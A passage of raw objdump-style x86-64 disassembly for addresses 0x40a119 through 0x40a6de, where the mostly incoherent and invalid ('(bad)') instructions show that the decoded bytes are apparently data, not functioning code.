  40a119:	5b                   	pop    %rbx
  40a11a:	5d                   	pop    %rbp
  40a11b:	00 00                	add    %al,(%rax)
  40a11d:	26 01 00             	es add %eax,(%rax)
  40a120:	a7                   	cmpsl  (%rdi),(%rsi)
  40a121:	39 d6                	cmp    %edx,%esi
  40a123:	57                   	push   %rdi
  40a124:	e3 05                	jrcxz  0x40a12b
  40a126:	02 da                	add    %dl,%bl
  40a128:	40 6d                	rex insl (%dx),(%rdi)
  40a12a:	91                   	xchg   %eax,%ecx
  40a12b:	a4                   	movsb  (%rsi),(%rdi)
  40a12c:	a7                   	cmpsl  (%rdi),(%rsi)
  40a12d:	0e                   	(bad)
  40a12e:	9b                   	fwait
  40a12f:	19 ed                	sbb    %ebp,%ebp
  40a131:	e2 1d                	loop   0x40a150
  40a133:	c9                   	leave
  40a134:	b3 88                	mov    $0x88,%bl
  40a136:	fe                   	(bad)
  40a137:	3f                   	(bad)
  40a138:	13 33                	adc    (%rbx),%esi
  40a13a:	c8 9a 10 af          	enter  $0x109a,$0xaf
  40a13e:	6a 6a                	push   $0x6a
  40a140:	70 08                	jo     0x40a14a
  40a142:	eb 24                	jmp    0x40a168
  40a144:	08 01                	or     %al,(%rcx)
  40a146:	00 03                	add    %al,(%rbx)
  40a148:	00 00                	add    %al,(%rax)
  40a14a:	00 00                	add    %al,(%rax)
  40a14c:	00 06                	add    %al,(%rsi)
  40a14e:	20 01                	and    %al,(%rcx)
  40a150:	01 11                	add    %edx,(%rcx)
  40a152:	81 61 04 01 00 00 00 	andl   $0x1,0x4(%rcx)
  40a159:	00 00                	add    %al,(%rax)
  40a15b:	00 fc                	add    %bh,%ah
  40a15d:	05 00 00 40 38       	add    $0x38400000,%eax
  40a162:	4b 82                	rex.WXB (bad)
  40a164:	d6                   	udb
  40a165:	f3 85 83 fd a6 00 27 	repz test %eax,0x2700a6fd(%rbx)
  40a16c:	bc 9e 74 e4 94       	mov    $0x94e4749e,%esp
  40a171:	6b cf 3b             	imul   $0x3b,%edi,%ecx
  40a174:	25 a3 5f 7b ff       	and    $0xff7b5fa3,%eax
  40a179:	80 42 bf b6          	addb   $0xb6,-0x41(%rdx)
  40a17d:	61                   	(bad)
  40a17e:	aa                   	stos   %al,(%rdi)
  40a17f:	1e                   	(bad)
  40a180:	77 2f                	ja     0x40a1b1
  40a182:	13 33                	adc    (%rbx),%esi
  40a184:	a2 5b e2 98 0f 11 b2 	movabs %al,0xe750b2110f98e25b
  40a18b:	50 e7 
  40a18d:	77 cf                	ja     0x40a15e
  40a18f:	16                   	(bad)
  40a190:	20 54 ec 2b          	and    %dl,0x2b(%rsp,%rbp,8)
  40a194:	c7                   	(bad)
  40a195:	c9                   	leave
  40a196:	01 5a 72             	add    %ebx,0x72(%rdx)
  40a199:	31 00                	xor    %eax,(%rax)
  40a19b:	98                   	cwtl
  40a19c:	bc c6 4a 32 d8       	mov    $0xd8324ac6,%esp
  40a1a1:	51                   	push   %rcx
  40a1a2:	18 04 bf             	sbb    %al,(%rdi,%rdi,4)
  40a1a5:	34 3b                	xor    $0x3b,%al
  40a1a7:	3d 55 5e 71 4a       	cmp    $0x4a715e55,%eax
  40a1ac:	1d ac a5 9f 13       	sbb    $0x139fa5ac,%eax
  40a1b1:	c4                   	(bad)
  40a1b2:	5f                   	pop    %rdi
  40a1b3:	8e ea                	mov    %edx,%gs
  40a1b5:	4c db 43 29          	rex.WR fildl 0x29(%rbx)
  40a1b9:	7e 38                	jle    0x40a1f3
  40a1bb:	d3 07                	roll   %cl,(%rdi)
  40a1bd:	48                   	rex.W
  40a1be:	9b                   	fwait
  40a1bf:	48 72 3d             	rex.W jb 0x40a1ff
  40a1c2:	1a 88 c0 1a a6 ef    	sbb    -0x1059e540(%rax),%cl
  40a1c8:	c1 4f 6d 23          	rorl   $0x23,0x6d(%rdi)
  40a1cc:	46                   	rex.RX
  40a1cd:	41 09 6e a0          	or     %ebp,-0x60(%r14)
  40a1d1:	0a bd 7a a0 da 97    	or     -0x68255f86(%rbp),%bh
  40a1d7:	57                   	push   %rdi
  40a1d8:	3d 2e 37 eb a6       	cmp    $0xa6eb372e,%eax
  40a1dd:	e2 d7                	loop   0x40a1b6
  40a1df:	16                   	(bad)
  40a1e0:	bf bd a0 a7 45       	mov    $0x45a7a0bd,%edi
  40a1e5:	55                   	push   %rbp
  40a1e6:	c0 a1 88 98 0f 34 33 	shlb   $0x33,0x340f9888(%rcx)
  40a1ed:	ea                   	(bad)
  40a1ee:	2e 18 3d ce c3 55 70 	cs sbb %bh,0x7055c3ce(%rip)        # 0x709665c3
  40a1f5:	44 dd a9 ff 82 43 35 	rex.R (bad) 0x354382ff(%rcx)
  40a1fc:	9a                   	(bad)
  40a1fd:	51                   	push   %rcx
  40a1fe:	2c c6                	sub    $0xc6,%al
  40a200:	e4 03                	in     $0x3,%al
  40a202:	7c a9                	jl     0x40a1ad
  40a204:	60                   	(bad)
  40a205:	8c f7                	mov    %?,%edi
  40a207:	ae                   	scas   (%rdi),%al
  40a208:	b5 a5                	mov    $0xa5,%ch
  40a20a:	a6                   	cmpsb  (%rdi),(%rsi)
  40a20b:	41 35 d7 2f de 6b    	rex.B xor $0x6bde2fd7,%eax
  40a211:	86 d7                	xchg   %dl,%bh
  40a213:	40 a9 fd f8 36 b1    	rex test $0xb136f8fd,%eax
  40a219:	d4                   	(bad)
  40a21a:	fe 05 c0 28 83 74    	incb   0x748328c0(%rip)        # 0x74c3cae0
  40a220:	6d                   	insl   (%dx),(%rdi)
  40a221:	77 f2                	ja     0x40a215
  40a223:	1f                   	(bad)
  40a224:	c7 07 45 79 18 7f    	movl   $0x7f187945,(%rdi)
  40a22a:	7f 32                	jg     0x40a25e
  40a22c:	d3 ab 56 9e 11 bc    	shrl   %cl,-0x43ee61aa(%rbx)
  40a232:	10 99 e1 05 9b 46    	adc    %bl,0x469b05e1(%rcx)
  40a238:	90                   	nop
  40a239:	af                   	scas   (%rdi),%eax
  40a23a:	59                   	pop    %rcx
  40a23b:	a6                   	cmpsb  (%rdi),(%rsi)
  40a23c:	1d 48 73 cc a9       	sbb    $0xa9cc7348,%eax
  40a241:	dc a3 2e e1 35 cc    	fsubl  -0x33ca1ed2(%rbx)
  40a247:	ed                   	in     (%dx),%eax
  40a248:	8f 47 4d             	pop    0x4d(%rdi)
  40a24b:	2d 18 ea ed df       	sub    $0xdfedea18,%eax
  40a250:	1a ae 0a 65 a3 ba    	sbb    -0x455c9af6(%rsi),%ch
  40a256:	3d 54 ec e7 89       	cmp    $0x89e7ec54,%eax
  40a25b:	eb 30                	jmp    0x40a28d
  40a25d:	2a 20                	sub    (%rax),%ah
  40a25f:	56                   	push   %rsi
  40a260:	cf                   	iret
  40a261:	e8 86 2e f5 4c       	call   0x4d35d0ec
  40a266:	0e                   	(bad)
  40a267:	ee                   	out    %al,(%dx)
  40a268:	1c 14                	sbb    $0x14,%al
  40a26a:	59                   	pop    %rcx
  40a26b:	1d 4e ad 94 4f       	sbb    $0x4f94ad4e,%eax
  40a270:	4f aa                	rex.WRXB stos %al,(%rdi)
  40a272:	7c 85                	jl     0x40a1f9
  40a274:	61                   	(bad)
  40a275:	92                   	xchg   %eax,%edx
  40a276:	91                   	xchg   %eax,%ecx
  40a277:	d9 6e c4             	fldcw  -0x3c(%rsi)
  40a27a:	0d 74 f0 7d ac       	or     $0xac7df074,%eax
  40a27f:	50                   	push   %rax
  40a280:	5c                   	pop    %rsp
  40a281:	18 55 51             	sbb    %dl,0x51(%rbp)
  40a284:	71 7e                	jno    0x40a304
  40a286:	3a 6f a9             	cmp    -0x57(%rdi),%ch
  40a289:	8c b1 95 d2 84 54    	mov    %?,0x5484d295(%rcx)
  40a28f:	e1 76                	loope  0x40a307
  40a291:	73 b8                	jae    0x40a24b
  40a293:	26 24 cb             	es and $0xcb,%al
  40a296:	10 39                	adc    %bh,(%rcx)
  40a298:	43 75 b7             	rex.XB jne 0x40a252
  40a29b:	22 2c d9             	and    (%rcx,%rbx,8),%ch
  40a29e:	c3                   	ret
  40a29f:	3c 78                	cmp    $0x78,%al
  40a2a1:	76 d8                	jbe    0x40a27b
  40a2a3:	25 38 a0 54 27       	and    $0x2754a038,%eax
  40a2a8:	a7                   	cmpsl  (%rdi),(%rsi)
  40a2a9:	1a 02                	sbb    (%rdx),%al
  40a2ab:	39 54 94 00          	cmp    %edx,0x0(%rsp,%rdx,4)
  40a2af:	45 ac                	rex.RB lods (%rsi),%al
  40a2b1:	2d bc e5 8e 52       	sub    $0x528ee5bc,%eax
  40a2b6:	a6                   	cmpsb  (%rdi),(%rsi)
  40a2b7:	c3                   	ret
  40a2b8:	68 c6 95 4a ef       	push   $0xffffffffef4a95c6
  40a2bd:	87 f1                	xchg   %esi,%ecx
  40a2bf:	25 67 9b f1 2d       	and    $0x2df19b67,%eax
  40a2c4:	6d                   	insl   (%dx),(%rdi)
  40a2c5:	72 3f                	jb     0x40a306
  40a2c7:	ea                   	(bad)
  40a2c8:	9d                   	popf
  40a2c9:	82                   	(bad)
  40a2ca:	8e b9 90 4a 9f fe    	mov    -0x160b570(%rcx),%?
  40a2d0:	36 80 cd c8          	ss or  $0xc8,%ch
  40a2d4:	2a 15 b1 80 96 9c    	sub    -0x63697f4f(%rip),%dl        # 0xffffffff9cd7238b
  40a2da:	73 19                	jae    0x40a2f5
  40a2dc:	e3 97                	jrcxz  0x40a275
  40a2de:	85 ba 07 0a 63 f9    	test   %edi,-0x69cf5f9(%rdx)
  40a2e4:	19 1a                	sbb    %ebx,(%rdx)
  40a2e6:	90                   	nop
  40a2e7:	f2 2c b3             	repnz sub $0xb3,%al
  40a2ea:	aa                   	stos   %al,(%rdi)
  40a2eb:	03 1e                	add    (%rsi),%ebx
  40a2ed:	4a b2 06             	rex.WX mov $0x6,%dl
  40a2f0:	51                   	push   %rcx
  40a2f1:	aa                   	stos   %al,(%rdi)
  40a2f2:	f9                   	stc
  40a2f3:	7c 5e                	jl     0x40a353
  40a2f5:	42 81 12 55 73 f7 13 	rex.X adcl $0x13f77355,(%rdx)
  40a2fc:	96                   	xchg   %eax,%esi
  40a2fd:	80 08 31             	orb    $0x31,(%rax)
  40a300:	4e d7                	rex.WRX xlat (%rbx)
  40a302:	b0 fa                	mov    $0xfa,%al
  40a304:	9d                   	popf
  40a305:	55                   	push   %rbp
  40a306:	07                   	(bad)
  40a307:	e0 1f                	loopne 0x40a328
  40a309:	32 37                	xor    (%rdi),%dh
  40a30b:	04 09                	add    $0x9,%al
  40a30d:	1b 40 03             	sbb    0x3(%rax),%eax
  40a310:	4b bf b1 1d ac f7 3a 	rex.WXB movabs $0xd86a9d3af7ac1db1,%r15
  40a317:	9d 6a d8 
  40a31a:	c2 55 57             	ret    $0x5755
  40a31d:	a8 0c                	test   $0xc,%al
  40a31f:	e9 26 21 52 76       	jmp    0x7692c44a
  40a324:	32 f7                	xor    %bh,%dh
  40a326:	43 29 75 bc          	rex.XB sub %esi,-0x44(%r13)
  40a32a:	9d                   	popf
  40a32b:	53                   	push   %rbx
  40a32c:	db 69 c6             	fldt   -0x3a(%rcx)
  40a32f:	3f                   	(bad)
  40a330:	83 7f 64 20          	cmpl   $0x20,0x64(%rdi)
  40a334:	39 6b 71             	cmp    %ebp,0x71(%rbx)
  40a337:	a8 4b                	test   $0x4b,%al
  40a339:	87 c6                	xchg   %eax,%esi
  40a33b:	05 49 17 61 74       	add    $0x74611749,%eax
  40a340:	ab                   	stos   %eax,(%rdi)
  40a341:	d5 52 21 d0          	{rex2 0x52} and %r18d,%r16d
  40a345:	6e                   	outsb  (%rsi),(%dx)
  40a346:	a4                   	movsb  (%rsi),(%rdi)
  40a347:	43 12 25 a0 77 6b 50 	rex.XB adc 0x506b77a0(%rip),%spl        # 0x50ac1aee
  40a34e:	a0 38 2e 5a cf 26 56 	movabs 0x64e05626cf5a2e38,%al
  40a355:	e0 64 
  40a357:	42 fd                	rex.X std
  40a359:	88 7c d6 53          	mov    %bh,0x53(%rsi,%rdx,8)
  40a35d:	4d d4                	rex.WRB (bad)
  40a35f:	5c                   	pop    %rsp
  40a360:	f6 fb                	idiv   %bl
  40a362:	dc 23                	fsubl  (%rbx)
  40a364:	d1 03                	roll   $1,(%rbx)
  40a366:	6e                   	outsb  (%rsi),(%dx)
  40a367:	21 f9                	and    %edi,%ecx
  40a369:	40                   	rex
  40a36a:	46 9d                	rex.RX popf
  40a36c:	48 53                	rex.W push %rbx
  40a36e:	c2 ff 0b             	ret    $0xbff
  40a371:	31 80 4a 22 aa f2    	xor    %eax,-0xd55ddb6(%rax)
  40a377:	0e                   	(bad)
  40a378:	38 af 4b 33 39 01    	cmp    %ch,0x139334b(%rdi)
  40a37e:	67 0f 05             	addr32 syscall
  40a381:	66 e1 2a             	data16 loope 0x40a3ae
  40a384:	69 d6 a4 34 65 7e    	imul   $0x7e6534a4,%esi,%edx
  40a38a:	8f                   	(bad)
  40a38b:	33 98 ec 9e 0b f5    	xor    -0xaf46114(%rax),%ebx
  40a391:	5f                   	pop    %rdi
  40a392:	28 f9                	sub    %bh,%cl
  40a394:	b6 e3                	mov    $0xe3,%dh
  40a396:	ab                   	stos   %eax,(%rdi)
  40a397:	da bd 49 f2 32 00    	fidivrl 0x32f249(%rbp)
  40a39d:	fe                   	(bad)
  40a39e:	17                   	(bad)
  40a39f:	0b ff                	or     %edi,%edi
  40a3a1:	90                   	nop
  40a3a2:	cb                   	lret
  40a3a3:	43 ef                	rex.XB out %eax,(%dx)
  40a3a5:	a3 dc 4d 6f 20 83 d8 	movabs %eax,0xadebd883206f4ddc
  40a3ac:	eb ad 
  40a3ae:	9d                   	popf
  40a3af:	4a ff 97 65 d9 e8 e6 	rex.WX call *-0x1917269b(%rdi)
  40a3b6:	50                   	push   %rax
  40a3b7:	20 96 ae 0d f1 53    	and    %dl,0x53f10dae(%rsi)
  40a3bd:	5f                   	pop    %rdi
  40a3be:	c5 35 61 c0          	vpunpcklwd %ymm0,%ymm9,%ymm8
  40a3c2:	e5 b8                	in     $0xb8,%eax
  40a3c4:	90                   	nop
  40a3c5:	ee                   	out    %al,(%dx)
  40a3c6:	fe 0f                	decb   (%rdi)
  40a3c8:	4e 92                	rex.WRX xchg %rax,%rdx
  40a3ca:	1b 46 39             	sbb    0x39(%rsi),%eax
  40a3cd:	8c c1                	mov    %es,%ecx
  40a3cf:	a3 29 d6 60 16 ca 51 	movabs %eax,0xef1151ca1660d629
  40a3d6:	11 ef 
  40a3d8:	c2 99 00             	ret    $0x99
  40a3db:	ff 9e 75 07 e9 75    	lcall  *0x75e90775(%rsi)
  40a3e1:	41 63 45 65          	movsxd 0x65(%r13),%eax
  40a3e5:	03 8e 41 f9 60 a8    	add    -0x579f06bf(%rsi),%ecx
  40a3eb:	65 e3 b8             	gs jrcxz 0x40a3a6
  40a3ee:	23 96 3a 43 83 dd    	and    -0x227cbcc6(%rsi),%edx
  40a3f4:	39 13                	cmp    %edx,(%rbx)
  40a3f6:	7a e4                	jp     0x40a3dc
  40a3f8:	6c                   	insb   (%dx),(%rdi)
  40a3f9:	ec                   	in     (%dx),%al
  40a3fa:	fa                   	cli
  40a3fb:	0a 72 b1             	or     -0x4f(%rdx),%dh
  40a3fe:	2d 45 44 22 d8       	sub    $0xd8224445,%eax
  40a403:	27                   	(bad)
  40a404:	35 ea 34 11 39       	xor    $0x391134ea,%eax
  40a409:	8d 9b 79 29 fe ae    	lea    -0x5101d687(%rbx),%ebx
  40a40f:	35 69 7e 3f 49       	xor    $0x493f7e69,%eax
  40a414:	9e                   	sahf
  40a415:	7a d8                	jp     0x40a3ef
  40a417:	18 95 0e 69 02 d5    	sbb    %dl,-0x2afd96f2(%rbp)
  40a41d:	2b 2b                	sub    (%rbx),%ebp
  40a41f:	9c                   	pushf
  40a420:	6a 0d                	push   $0xd
  40a422:	ae                   	scas   (%rdi),%al
  40a423:	f8                   	clc
  40a424:	31 6f e7             	xor    %ebp,-0x19(%rdi)
  40a427:	ef                   	out    %eax,(%dx)
  40a428:	81 44 b4 25 68 82 d5 	addl   $0xe4d58268,0x25(%rsp,%rsi,4)
  40a42f:	e4 
  40a430:	74 c7                	je     0x40a3f9
  40a432:	21 40 a5             	and    %eax,-0x5b(%rax)
  40a435:	83 a6 38 95 18 8c 1e 	andl   $0x1e,-0x73e76ac8(%rsi)
  40a43c:	67 32 5d 72          	xor    0x72(%ebp),%bl
  40a440:	11 f7                	adc    %esi,%edi
  40a442:	bc 33 0f 7a 08       	mov    $0x87a0f33,%esp
  40a447:	94                   	xchg   %eax,%esp
  40a448:	d3 ef                	shr    %cl,%edi
  40a44a:	87 9a 97 86 dd c2    	xchg   %ebx,-0x3d227969(%rdx)
  40a450:	c4                   	(bad)
  40a451:	0c 49                	or     $0x49,%al
  40a453:	3f                   	(bad)
  40a454:	82                   	(bad)
  40a455:	ec                   	in     (%dx),%al
  40a456:	a1 4b 64 e5 6c 2e 08 	movabs 0xd4da082e6ce5644b,%eax
  40a45d:	da d4 
  40a45f:	29 39                	sub    %edi,(%rcx)
  40a461:	ca 67 28             	lret   $0x2867
  40a464:	69 63 75 0e 55 ae 9f 	imul   $0x9fae550e,0x75(%rbx),%esp
  40a46b:	37                   	(bad)
  40a46c:	92                   	xchg   %eax,%edx
  40a46d:	62 2f 40 7c 3c       	(bad)
  40a472:	4e 17                	rex.WRX (bad)
  40a474:	92                   	xchg   %eax,%edx
  40a475:	81 bc ee 4e 8d 94 05 	cmpl   $0x7f87cf9d,0x5948d4e(%rsi,%rbp,8)
  40a47c:	9d cf 87 7f 
  40a480:	37                   	(bad)
  40a481:	7b f4                	jnp    0x40a477
  40a483:	0f 1a da             	nop    %edx
  40a486:	55                   	push   %rbp
  40a487:	e2 4b                	loop   0x40a4d4
  40a489:	3a bd db 6c e4 81    	cmp    -0x7e1b9325(%rbp),%bh
  40a48f:	9a                   	(bad)
  40a490:	ff aa da 31 27 81    	ljmp   *-0x7ed8ce26(%rdx)
  40a496:	62 25 c5 92 0f       	(bad)
  40a49b:	4f d7                	rex.WRXB xlat (%rbx)
  40a49d:	28 45 33             	sub    %al,0x33(%rbp)
  40a4a0:	f3 95                	repz xchg %eax,%ebp
  40a4a2:	ed                   	in     (%dx),%eax
  40a4a3:	a4                   	movsb  (%rsi),(%rdi)
  40a4a4:	c4                   	(bad)
  40a4a5:	f7 99 ba 22 f1 6d    	negl   0x6df122ba(%rcx)
  40a4ab:	03 2b                	add    (%rbx),%ebp
  40a4ad:	7d 39                	jge    0x40a4e8
  40a4af:	13 bb 87 60 3f 59    	adc    0x593f6087(%rbx),%edi
  40a4b5:	20 59 45             	and    %bl,0x45(%rcx)
  40a4b8:	4a 85 a6 a0 71 26 5c 	rex.WX test %rsp,0x5c2671a0(%rsi)
  40a4bf:	fd                   	std
  40a4c0:	0c 98                	or     $0x98,%al
  40a4c2:	5c                   	pop    %rsp
  40a4c3:	c5 6c 67             	(bad)
  40a4c6:	f7 ae c6 1d 83 40    	imull  0x40831dc6(%rsi)
  40a4cc:	7b 61                	jnp    0x40a52f
  40a4ce:	24 cb                	and    $0xcb,%al
  40a4d0:	b1 ee                	mov    $0xee,%cl
  40a4d2:	1d 42 7d 13 ef       	sbb    $0xef137d42,%eax
  40a4d7:	68 25 8c 68 45       	push   $0x45688c25
  40a4dc:	e5 7b                	in     $0x7b,%eax
  40a4de:	f6 cf 18             	test   $0x18,%bh
  40a4e1:	00 0f                	add    %cl,(%rdi)
  40a4e3:	58                   	pop    %rax
  40a4e4:	92                   	xchg   %eax,%edx
  40a4e5:	83 fa 3b             	cmp    $0x3b,%edx
  40a4e8:	90                   	nop
  40a4e9:	25 f8 8f b8 09       	and    $0x9b88ff8,%eax
  40a4ee:	41                   	rex.B
  40a4ef:	43 53                	rex.XB push %r11
  40a4f1:	33 9a ec fb 83 86    	xor    -0x797c0414(%rdx),%ebx
  40a4f7:	3d dc c5 46 ec       	cmp    $0xec46c5dc,%eax
  40a4fc:	87 00                	xchg   %eax,(%rax)
  40a4fe:	c5 18 9a             	(bad)
  40a501:	09 4a 72             	or     %ecx,0x72(%rdx)
  40a504:	6e                   	outsb  (%rsi),(%dx)
  40a505:	1d 4c 96 bd 91       	sbb    $0x91bd964c,%eax
  40a50a:	34 35                	xor    $0x35,%al
  40a50c:	4d 2b 14 11          	sub    (%r9,%rdx,1),%r10
  40a510:	4f 71 ac             	rex.WRXB jno 0x40a4bf
  40a513:	fd                   	std
  40a514:	21 93 67 2f 79 92    	and    %edx,-0x6d86d099(%rbx)
  40a51a:	3d 49 18 3d 64       	cmp    $0x643d1849,%eax
  40a51f:	54                   	push   %rsp
  40a520:	e7 f4                	out    %eax,$0xf4
  40a522:	a3 44 56 64 1d 4a ff 	movabs %eax,0xdc8eff4a1d645644
  40a529:	8e dc 
  40a52b:	05 90 13 5e f9       	add    $0xf95e1390,%eax
  40a530:	9f                   	lahf
  40a531:	f0 97                	lock xchg %eax,%edi
  40a533:	30 c9                	xor    %cl,%cl
  40a535:	24 8d                	and    $0x8d,%al
  40a537:	23 1b                	and    (%rbx),%ebx
  40a539:	46 ea                	rex.RX (bad)
  40a53b:	43 74 36             	rex.XB je 0x40a574
  40a53e:	2e 2f                	cs (bad)
  40a540:	1a 86 8d cf d3 c0    	sbb    -0x3f2c3073(%rsi),%al
  40a546:	7f 15                	jg     0x40a55d
  40a548:	7a 83                	jp     0x40a4cd
  40a54a:	a2 f8 25 36 05 a1 c6 	movabs %al,0x322dc6a1053625f8
  40a551:	2d 32 
  40a553:	4c 31 ec             	xor    %r13,%rsp
  40a556:	4f df 13             	rex.WRXB fists (%r11)
  40a559:	01 cb                	add    %ecx,%ebx
  40a55b:	fd                   	std
  40a55c:	c1 ce 0b             	ror    $0xb,%esi
  40a55f:	b6 36                	mov    $0x36,%dh
  40a561:	aa                   	stos   %al,(%rdi)
  40a562:	2b 69 7a             	sub    0x7a(%rcx),%ebp
  40a565:	8f 80 ce f1 51 03    	pop    0x351f1ce(%rax)
  40a56b:	27                   	(bad)
  40a56c:	eb 36                	jmp    0x40a5a4
  40a56e:	96                   	xchg   %eax,%esi
  40a56f:	e3 53                	jrcxz  0x40a5c4
  40a571:	25 77 3e aa ce       	and    $0xceaa3e77,%eax
  40a576:	6b 45 82 14          	imul   $0x14,-0x7e(%rbp),%eax
  40a57a:	04 a3                	add    $0xa3,%al
  40a57c:	1d d0 14 da 12       	sbb    $0x12da14d0,%eax
  40a581:	91                   	xchg   %eax,%ecx
  40a582:	f9                   	stc
  40a583:	32 5f 7b             	xor    0x7b(%rdi),%bl
  40a586:	9a                   	(bad)
  40a587:	ce                   	(bad)
  40a588:	04 e9                	add    $0xe9,%al
  40a58a:	bb 1a 83 f8 fd       	mov    $0xfdf8831a,%ebx
  40a58f:	72 cf                	jb     0x40a560
  40a591:	ea                   	(bad)
  40a592:	ec                   	in     (%dx),%al
  40a593:	38 8c 76 a9 9a ff d4 	cmp    %cl,-0x2b006557(%rsi,%rsi,2)
  40a59a:	b8 49 09 6a 4f       	mov    $0x4f6a0949,%eax
  40a59f:	38 2b                	cmp    %ch,(%rbx)
  40a5a1:	71 96                	jno    0x40a539
  40a5a3:	ff 58 6e             	lcall  *0x6e(%rax)
  40a5a6:	21 a3 b3 35 2b 89    	and    %esp,-0x76d4ca4d(%rbx)
  40a5ac:	84 9b c1 47 ce 57    	test   %bl,0x57ce47c1(%rbx)
  40a5b2:	89 c0                	mov    %eax,%eax
  40a5b4:	31 30                	xor    %esi,(%rax)
  40a5b6:	29 ec                	sub    %ebp,%esp
  40a5b8:	b2 f3                	mov    $0xf3,%dl
  40a5ba:	13 a7 c1 eb cd b7    	adc    -0x4832143f(%rdi),%esp
  40a5c0:	aa                   	stos   %al,(%rdi)
  40a5c1:	5f                   	pop    %rdi
  40a5c2:	ac                   	lods   (%rsi),%al
  40a5c3:	20 68 bc             	and    %ch,-0x44(%rax)
  40a5c6:	2b 72 bd             	sub    -0x43(%rdx),%esi
  40a5c9:	5b                   	pop    %rbx
  40a5ca:	a3 a4 32 b5 5b 96 73 	movabs %eax,0x126473965bb532a4
  40a5d1:	64 12 
  40a5d3:	db f6                	fcomi  %st(6),%st
  40a5d5:	05 97 24 4e f1       	add    $0xf14e2497,%eax
  40a5da:	91                   	xchg   %eax,%ecx
  40a5db:	b7 39                	mov    $0x39,%bh
  40a5dd:	9e                   	sahf
  40a5de:	ee                   	out    %al,(%dx)
  40a5df:	4d 55                	rex.WRB push %r13
  40a5e1:	3f                   	(bad)
  40a5e2:	73 ff                	jae    0x40a5e3
  40a5e4:	3e 2b dc             	ds sub %esp,%ebx
  40a5e7:	a7                   	cmpsl  (%rdi),(%rsi)
  40a5e8:	ef                   	out    %eax,(%dx)
  40a5e9:	0e                   	(bad)
  40a5ea:	33 f9                	xor    %ecx,%edi
  40a5ec:	82                   	(bad)
  40a5ed:	52                   	push   %rdx
  40a5ee:	07                   	(bad)
  40a5ef:	ad                   	lods   (%rsi),%eax
  40a5f0:	d6                   	udb
  40a5f1:	0d 3d 11 3c ee       	or     $0xee3c113d,%eax
  40a5f6:	77 0e                	ja     0x40a606
  40a5f8:	3f                   	(bad)
  40a5f9:	12 9f 2d 56 f0 82    	adc    -0x7d0fa9d3(%rdi),%bl
  40a5ff:	12 19                	adc    (%rcx),%bl
  40a601:	80 5f b7 14          	sbbb   $0x14,-0x49(%rdi)
  40a605:	32 72 18             	xor    0x18(%rdx),%dh
  40a608:	25 6d 1f f1 6b       	and    $0x6bf11f6d,%eax
  40a60d:	b4 fb                	mov    $0xfb,%ah
  40a60f:	ec                   	in     (%dx),%al
  40a610:	9e                   	sahf
  40a611:	05 f5 07 63 11       	add    $0x116307f5,%eax
  40a616:	f4                   	hlt
  40a617:	58                   	pop    %rax
  40a618:	3f                   	(bad)
  40a619:	59                   	pop    %rcx
  40a61a:	7f ba                	jg     0x40a5d6
  40a61c:	7e 9c                	jle    0x40a5ba
  40a61e:	07                   	(bad)
  40a61f:	38 7b 4f             	cmp    %bh,0x4f(%rbx)
  40a622:	25 8b fb fe 49       	and    $0x49fefb8b,%eax
  40a627:	fd                   	std
  40a628:	2e 1f                	cs (bad)
  40a62a:	29 a4 8b 94 d9 8f e2 	sub    %esp,-0x1d70266c(%rbx,%rcx,4)
  40a631:	d3 be de 16 ee 79    	sarl   %cl,0x79ee16de(%rsi)
  40a637:	fd                   	std
  40a638:	f4                   	hlt
  40a639:	95                   	xchg   %eax,%ebp
  40a63a:	6c                   	insb   (%dx),(%rdi)
  40a63b:	23 61 f9             	and    -0x7(%rcx),%esp
  40a63e:	29 41 97             	sub    %eax,-0x69(%rcx)
  40a641:	b2 79                	mov    $0x79,%dl
  40a643:	4c f1                	rex.WR int1
  40a645:	c0 ff bc             	sar    $0xbc,%bh
  40a648:	09 44 06 e0          	or     %eax,-0x20(%rsi,%rax,1)
  40a64c:	ad                   	lods   (%rsi),%eax
  40a64d:	37                   	(bad)
  40a64e:	04 1a                	add    $0x1a,%al
  40a650:	d5 ad d3 cc          	{rex2 0xad} psrlq %mm4,%mm1
  40a654:	3a 7c b0 4d          	cmp    0x4d(%rax,%rsi,4),%bh
  40a658:	42 8e c5             	rex.X mov %ebp,%es
  40a65b:	22 0b                	and    (%rbx),%cl
  40a65d:	85 fa                	test   %edi,%edx
  40a65f:	41                   	rex.B
  40a660:	49 31 f3             	xor    %rsi,%r11
  40a663:	4c 0e                	rex.WR (bad)
  40a665:	a1 1f bd d1 e2 87 d8 	movabs 0xc55bd887e2d1bd1f,%eax
  40a66c:	5b c5 
  40a66e:	93                   	xchg   %eax,%ebx
  40a66f:	4a 81 27 f8 ad bf c6 	rex.WX andq $0xffffffffc6bfadf8,(%rdi)
  40a676:	a8 d6                	test   $0xd6,%al
  40a678:	94                   	xchg   %eax,%esp
  40a679:	2a 33                	sub    (%rbx),%dh
  40a67b:	33 c5                	xor    %ebp,%eax
  40a67d:	62 dd 04 2f e8       	(bad)
  40a682:	68 3d d6 ad a5       	push   $0xffffffffa5add63d
  40a687:	45 29 93 b5 20 5e 9e 	sub    %r10d,-0x61a1df4b(%r11)
  40a68e:	96                   	xchg   %eax,%esi
  40a68f:	46 77 a1             	rex.RX ja 0x40a633
  40a692:	31 c5                	xor    %eax,%ebp
  40a694:	43 ca 62 ac          	rex.XB lret $0xac62
  40a698:	3f                   	(bad)
  40a699:	ed                   	in     (%dx),%eax
  40a69a:	85 f5                	test   %esi,%ebp
  40a69c:	72 e1                	jb     0x40a67f
  40a69e:	26 03 de             	es add %esi,%ebx
  40a6a1:	4d 68 2c ca 68 12    	rex.WRB push $0x1268ca2c
  40a6a7:	dd a7 b6 44 f9 a2    	frstor -0x5d06bb4a(%rdi)
  40a6ad:	fd                   	std
  40a6ae:	8c ad 5a c9 e5 06    	mov    %gs,0x6e5c95a(%rbp)
  40a6b4:	c5 be 71             	(bad)
  40a6b7:	0e                   	(bad)
  40a6b8:	81 87 eb 2f 25 59 a9 	addl   $0x259f0fa9,0x59252feb(%rdi)
  40a6bf:	0f 9f 25 
  40a6c2:	93                   	xchg   %eax,%ebx
  40a6c3:	26 8a 98 14 12 00 8b 	es mov -0x74ffedec(%rax),%bl
  40a6ca:	69 29 20 af 2f f1    	imul   $0xf12faf20,(%rcx),%ebp
  40a6d0:	14 9d                	adc    $0x9d,%al
  40a6d2:	b5 97                	mov    $0x97,%ch
  40a6d4:	5d                   	pop    %rbp
  40a6d5:	42 1b 3f             	rex.X sbb (%rdi),%edi
  40a6d8:	82                   	(bad)
  40a6d9:	f2 75 f7             	bnd jne 0x40a6d3
  40a6dc:	34 13                	xor    $0x13,%al
  40a6de:	12 43 8b             	adc    -0x75(%rbx),%al
